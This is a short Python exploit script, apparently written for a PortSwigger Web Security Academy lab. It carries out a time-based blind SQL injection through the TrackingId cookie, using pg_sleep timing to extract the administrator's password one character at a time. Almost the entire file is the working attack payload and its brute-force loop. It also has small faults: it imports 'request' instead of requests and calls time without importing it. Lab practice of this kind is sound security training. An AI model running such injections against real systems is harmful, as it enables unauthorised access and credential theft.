#!/usr/bin/env python3

from pwn import *
from termcolor import colored
import request
import sys
import signal
import string

def def_handler(sig, frame):
  p1.failure("Ataque de fuerza bruta detenido")
  print(colored(f"\n[!] Saliendo...\n", 'red'))
  sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

p1 = log.progress("SQLI")

def makeSQLI():

  password = ""
  p1.status("Iniciando ataque de fuerza bruta")
  time.sleep(2)

  p2 = log.progress("Password")
  
  for position in range(1,21):
    for character in characters:
        cookies = {
          "TrackingId": f"y7MTaFfCr0QwwuQM'||(select case when substring(password,{position},1)='{character}' then pg_sleep(2) else pg_sleep(0) end from users where username='administrator')--",
          "session" : "VicnXIHZRxbIi676o6p72oFNo6wsPXXY"
        }

        p1.status(cookies["TrackingId"])
        
        time_start = time.time()
        
        r = requests.get("https://0aed007a0392d6038202799c00160038.web-security-academy.net", cookies=cookies)

        time_end = time.time()

        if (time_end - time_start) > 2:
          password += character
          p2.status(password)
          break
          
if __name__ == '__main__':
  
  makeSQLI()
